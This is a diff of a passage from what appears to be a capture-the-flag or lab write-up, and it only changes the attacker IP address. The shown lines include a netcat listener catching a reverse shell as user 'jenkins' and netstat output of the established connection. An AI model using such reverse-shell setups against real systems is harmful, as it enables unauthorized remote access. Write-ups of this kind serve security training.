@@ -201,7 +201,7 @@ And we're in:
 ```bash
 └─$ nc -nlvp 6969
 listening on [any] 6969 ...
-connect to [10.66.67.166] from (UNKNOWN) [10.150.150.38] 58262
+connect to [10.66.69.69] from (UNKNOWN) [10.150.150.38] 58262
 whoami
 jenkins
 ```
@@ -236,10 +236,10 @@ Active Internet connections (servers and established)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
 tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
 tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
-tcp        0    286 10.150.150.38:58264     10.66.67.166:6969       ESTABLISHED 636/bash            
+tcp        0    286 10.150.150.38:58264     10.66.69.69:6969       ESTABLISHED 636/bash            
 tcp6       0      0 :::30609                :::*                    LISTEN      467/java            
 tcp6       0      0 :::22                   :::*                    LISTEN      -                   
-tcp6       1      0 10.150.150.38:30609     10.66.67.166:48350      CLOSE_WAIT  467/java
+tcp6       1      0 10.150.150.38:30609     10.66.69.69:48350      CLOSE_WAIT  467/java
 ```
 
 # [](header-1)Port forwarding.
